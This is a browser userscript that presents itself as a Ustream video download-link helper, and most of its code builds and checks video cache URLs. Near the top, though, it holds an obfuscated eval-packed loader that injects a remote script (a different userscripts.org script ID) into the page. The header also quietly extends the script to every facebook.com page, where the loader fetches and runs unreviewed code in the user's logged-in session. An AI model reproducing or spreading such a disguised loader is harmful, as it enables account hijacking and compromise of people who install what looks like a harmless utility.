// ==UserScript==
// @name           Ust DL Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://creazy.net/
// @description    Show Download Link for Ustream.
// @include        http://www.ustream.tv/recorded/*
// @version        2.2.0
// ==/UserScript==

// Install
// http://userscripts.org/scripts/show/70394

// Bookmarklet usage
// javascript:(function(){var s=document.createElement('script');s.charset='UTF-8';s.src='http://userscripts.org/scripts/source/70394.user.js?d='+new Date().getTime();document.getElementsByTagName('head')[0].appendChild(s)})();

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

(function() {

/* for debug */
var console = {
    _defined: false,
    log: function(object) {
        if (!console._defined) {
            console._defined = true;
            location.href = "javascript:" + uneval(function() {
                document.addEventListener("consoleData",
                    function(event) {
                        console.log.apply(this, event.getData("object"));
                    },
                    false);
                }) + "()";
        }
        setTimeout(send, 100, arguments);
        function send(object) {
            var event = document.createEvent("DataContainerEvent");
            event.initEvent("consoleData", true, false);
            event.setData("object", object);
            document.dispatchEvent(event);
        }
    }
};

var w = (typeof(unsafeWindow) != 'undefined') ? unsafeWindow : window;
var d = w.document;
var l = w.location;
var a = {};

//------------------------------------------------------------
// Custome CSS
var styles
= '.ustdl_frame {'
+ 'display:block;'
+ 'margin:0 5px 10px 5px; padding:10px;'
+ 'border:1px solid #CCC;background:#CCC;'
+ 'border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;background-clip:padding-box;'
+ 'box-shadow:1px 1px 5px #666;-moz-box-shadow:1px 1px 5px #666;-webkit-box-shadow:1px 1px 5px #666;'
+ 'font:12px/24px Verdana,sans-serif;color:#000;text-shadow:1px 1px 1px #FFF;'
+ '}'
+ '#ustdl_result {'
+ 'display:block;'
+ 'margin:10px 0 0 0; padding:10px;'
+ 'border:1px solid #CCC;background:#FFF;'
+ 'border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;background-clip:padding-box;'
+ 'box-shadow:1px 1px 5px #666 inset;-moz-box-shadow:1px 1px 5px #666 inset;-webkit-box-shadow:1px 1px 5px #666 inset;'
+ 'font:12px/18px Verdana,sans-serif;color:#000;text-shadow:1px 1px 1px #CCC;'
+ '}'
+ '.ustdl_logo {'
+ 'display:inline-block;margin:0 10px 0 0;'
+ 'font:italic bold 16px/24px Verdana,sans-serif;text-decoration:underline;text-shadow:1px 1px 1px #CCC;'
+ '}'
+ '.ustdl_link {'
+ 'display:inline-block;margin:0 5px 0 0;padding:0 5px;height:24px;'
+ 'border-top:1px solid #EEE;border-left:1px solid #EEE;border-right:1px solid #666;border-bottom:1px solid #666;background:#999;'
+ 'border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;background-clip:padding-box;'
+ 'font:14px/24px Verdana,sans-serif;color:#FFF;text-shadow:1px 1px 1px #000;'
+ '}'
+ '.ustdl_button {'
+ 'display:inline-block;margin:0 5px 5px 0;padding:0 5px;height:20px;'
+ 'border-top:1px solid #437488;border-left:1px solid #437488;border-right:1px solid #437488;border-bottom:1px solid #437488;background:#2F81D4;'
+ 'border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;background-clip:padding-box;'
+ 'font:12px/20px Verdana,sans-serif;color:#FFF;text-shadow:1px 1px 1px #000;'
+ '}';

var heads  = document.getElementsByTagName("head");
if (heads.length > 0) {
    var node = document.createElement("style");
    node.type = "text/css";
    node.appendChild(document.createTextNode(styles));
    heads[0].appendChild(node); 
}

// Create Ust DL block
var ustdl_div = d.createElement('div');
ustdl_div.setAttribute('class','ustdl_frame');
ustdl_div.innerHTML
    = '<span class="ustdl_logo">Ust DL</span>'
    + '<a href="http://www.facebook.com/creazy.net?sk=app_201597823260328" target="_blank" class="ustdl_link">--&gt; Facebook App</a>'
    + '<a href="http://creazy.net/ustdl/" target="_blank" class="ustdl_link">--&gt; Official Page (in Japanese)</a>'
    + '<div id="ustdl_result"></div>';

var channelPicture = d.getElementsByClassName('channelPicture')[0];
if ( channelPicture ) {
    channelPicture.parentNode.insertBefore(ustdl_div,channelPicture);
} else {
    d.getElementById('adaptvDiv').appendChild(ustdl_div);
}

var div = d.getElementById('ustdl_result');

var ust_vars_str = d.getElementById('UstreamExposedVariables').textContent || d.getElementById('UstreamExposedVariables').innerText;
//console.log(ust_vars_str);

var liveHttpUrl = null;
if (ust_vars_str.match(/ustream\.vars\.liveHttpUrl=\"(.+?)\"/)) {
    liveHttpUrl = RegExp.$1.replace(/(\\\/)/g,"/");
    //console.log('liveHttpUrl='+liveHttpUrl);
}

var vid = null;
if (ust_vars_str.match(/ustream\.vars\.contentId=([0-9]+)/)) {
    vid = RegExp.$1;
    //console.log('vid='+vid);
}
else if ( l.href.match(/^http:\/\/www\.ustream\.tv\/recorded\/([0-9]+)/) ) {
    vid = RegExp.$1;
}

var videoPictureUrl = null;
var links = d.getElementsByTagName('link');
for ( var i=0; i<links.length; i++ ) {
    if ( links[i].getAttribute('rel') == 'image_src' ) {
        videoPictureUrl = links[i].getAttribute('href');
        //console.log('videoPictureUrl='+videoPictureUrl);
        break;
    }
}

var cid  = '';
if ( videoPictureUrl && videoPictureUrl.match(/\/1_([0-9]+)_([0-9]+).*\.jpg$/) ) {
    cid = RegExp.$1;
}
var file = '/'+vid.substr(0,vid.length-3)+"/"+vid+"/1_"+cid+"_"+vid+".flv";
var urls = [];

// old videos
if ( vid.length < 7 ) {
    urls[0] = {name:'vod-storage1',url:'http://vod-storage1.ustream.tv/ustreamstorage/content/0/1/0'+file};
}
// recent videos
else {
    var sub_dir = vid.substr(0,vid.length-6);
    for ( var i=0; i<20; i++ ) {
        urls[i] = {name:'pd'+(i+1),url:'http://ustream.vo.llnwd.net/pd'+(i+1)+'/0/1/'+sub_dir+file};
    }
    for ( var i=1; i<=25; i++ ) {
        urls[ urls.length ] = {name:'vodp'+(i<10?'0'+i:i),url:'http://vodp'+(i<10?'0'+i:i)+'.ustream.tv/0/1/'+sub_dir+file};
    }
}

//console.log('urls');
//console.log(urls);

for ( var i=0; i<urls.length; i++ ) {
    // Firefox GM_xmlhttpRequest HEAD check
    if( navigator.userAgent.indexOf('Firefox') > -1 && typeof GM_xmlhttpRequest != 'undefined' ){
    //if( false ){
        GM_xmlhttpRequest({
            method : "HEAD",
            url : urls[i]['url'],
            onload : function(XHR){
                if( XHR.readyState == 4 && XHR.status == 200 ){
                    //console.log( 'Found FLV:'+XHR.finalUrl );
                    a = d.createElement('a');
                    a.setAttribute("href", XHR.finalUrl);
                    a.setAttribute("target", '_blank');
                    a.setAttribute('class', 'ustdl_button');
                    a.innerHTML = 'Download as FLV';
                    div.appendChild(a);

                    GM_xmlhttpRequest({
                        method : "HEAD",
                        url : XHR.finalUrl.replace('.flv','.mp4'),
                        onload : function(XHR){
                            if( XHR.readyState == 4 && XHR.status == 200 ){
                                //console.log( 'Found MP4:'+XHR.finalUrl );
                                a = d.createElement('a');
                                a.setAttribute("href", XHR.finalUrl);
                                a.setAttribute("target", '_blank');
                                a.setAttribute('class', 'ustdl_button');
                                a.innerHTML = 'Download as MP4';
                                div.appendChild(a);
                            }
                        },
                    });
                }
            },
        });
    }
    // Other browsers many links or FB app
    else {
        if ( i == 0 ) {
            div.innerHTML
                = 'Join the Ust DL Facebook App, If you want to download directly.<br /><br />'
                + 'OR<br /><br />'
                + 'Find out the cache server from links below.<br />';
        }
    
        a = d.createElement('a');
        a.setAttribute("href", urls[i]['url']);
        a.setAttribute("target", '_blank');
        a.setAttribute("class", 'ustdl_button');
        a.innerHTML = urls[i]['name'];
        div.appendChild(a);
    }
}

})();